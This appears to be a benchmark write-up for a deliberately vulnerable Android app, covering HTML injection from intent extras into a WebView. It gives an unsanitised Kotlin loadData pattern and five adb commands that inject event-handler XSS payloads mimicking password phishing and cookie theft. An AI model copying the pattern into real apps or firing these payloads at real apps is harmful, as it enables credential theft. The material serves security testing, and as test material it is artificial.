# oxo-android-ben44: HTML Injection Through Intent Parameter

## Vulnerability Overview

HTML Injection Through Intent Parameter occurs when an Android app's WebView component displays content received from intent parameters without proper sanitization. This vulnerability allows attackers to inject malicious HTML, CSS, and JavaScript code through intent extras, leading to Cross-Site Scripting (XSS) attacks within the WebView context.

## Attack Vector: Event Handler Injection with Social Engineering

**Brief Explanation**: Injection of HTML elements with malicious event handlers that execute when users interact with the content, combined with social engineering to trick users into clicking.

**Key Characteristics:**
- Uses HTML event handlers (onclick, onmouseover, onerror)
- Requires user interaction to trigger
- Can be disguised as legitimate content
- Bypasses some XSS filters that only check for script tags

**Vulnerable Code Pattern:**
```kotlin
val title = intent.getStringExtra("title") ?: "Article"
val content = intent.getStringExtra("content") ?: "Content"
val html = "<h1>$title</h1><div>$content</div>"
webView.loadData(html, "text/html", "utf-8")  // VULNERABLE!
```

## Testing

```bash
# Malicious button with onclick handler
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<button onclick='alert(\"Credentials stolen: \" + prompt(\"Enter password to continue:\"))'>Click to Read Full Article</button>"

# Image with onerror handler
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<img src='invalid' onerror='alert(\"Cookie: \" + document.cookie)' style='display:none'><p>Loading article...</p>"

# Hover-triggered attack
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<div onmouseover='alert(\"Data stolen on hover!\")' style='padding:20px; background:#f0f0f0'>Hover over this text to read more</div>"

# Input field with onchange handler
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<p>Enter your email for newsletter:</p><input type='email' onchange='alert(\"Email stolen: \" + this.value)' placeholder='your@email.com'>"

# Link with onclick handler
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<a href='#' onclick='alert(\"User clicked malicious link!\"); return false;'>Click here for exclusive content</a>"
```

**Difficulty**: Easy

## Impact Assessment

- **Confidentiality**: High - Can access sensitive user input and app data
- **Integrity**: High - Can manipulate user interactions and steal credentials
- **Availability**: Medium - Can disrupt normal app functionality
- **OWASP Mobile Top 10**: M7 - Client Code Quality
- **CWE**: CWE-79 (Cross-site Scripting), CWE-20 (Improper Input Validation)
